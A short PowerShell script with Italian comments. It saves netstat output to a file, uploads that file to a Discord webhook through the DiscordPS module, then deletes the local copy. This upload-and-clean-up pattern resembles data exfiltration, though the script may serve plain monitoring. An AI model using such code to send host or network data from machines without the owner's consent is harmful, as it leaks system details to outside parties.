# Imposta il percorso del file in cui salvare l'output di netstat
$filePath = Join-Path $PSScriptRoot "netstat_output.txt"

# Esegue il comando netstat e salva l'output nel file specificato
netstat > $filePath

# Carica il modulo DiscordPS
Import-Module DiscordPS

# Crea il messaggio Discord
$messageParams = @{
    Webhook = $webhook
    Content = "Output di netstat:"
    File = $filePath
}

# Invia il file come allegato
Send-DiscordMessage @messageParams

# Elimina il file dopo l'invio (se necessario)
Remove-Item $filePath
